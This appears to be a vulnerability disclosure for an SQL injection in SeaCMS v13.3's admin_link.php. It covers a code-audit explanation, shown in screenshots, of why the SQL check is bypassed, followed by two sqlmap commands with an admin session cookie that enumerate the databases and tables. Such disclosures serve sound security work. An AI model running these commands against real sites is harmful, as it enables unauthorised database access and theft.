sql injection vulnerability exists in admin_link.php file in seacms v13.3 background.

download address：https://www.seacms.com/download/

![image-20250409105537792](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091055023.png)

Set up a local environment:

Here is not a demonstration, after the construction of the situation is as follows:

![image-20250409105629599](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091056163.png)

Code Audit Process

![image-20250409105810220](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091058514.png)

Here, when action equals delall, and $e_id is not empty, the  corresponding sql statement will be executed, and this $ids is  controllable.

![image-20250409110002763](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091100962.png)

Although there is a sql check, and initialization time set to true.

![image-20250409113728421](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091137517.png)

![image-20250409113815628](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091138743.png)

But admin_link.php contains config.php which is set to false, so this check does not hold.

![image-20250409113905531](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091139663.png)

![image-20250409113919997](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091139094.png)

sqlmap Run it:

```
python sqlmap.py -u "http://seacms.com:8888/2knum/admin_link.php?action=delall&e_id[]=111" -p "e_id[]" --cookie "t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; PHPSESSID=0c3k9fd0tah3h4i93v6g63dur6" --dbs
```

The cookie here is my login background cookie, specify it

![image-20250409110526488](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091105808.png)

You can run out of the database. 

The following is the table:

```
python sqlmap.py -u "http://seacms.com:8888/2knum/admin_link.php?action=delall&e_id[]=111" -p "e_id[]" --cookie "t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; PHPSESSID=0c3k9fd0tah3h4i93v6g63dur6" -D seacms --tables
```

![image-20250409114001293](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091140639.png)

The contents of the database behind can also be run out.

 
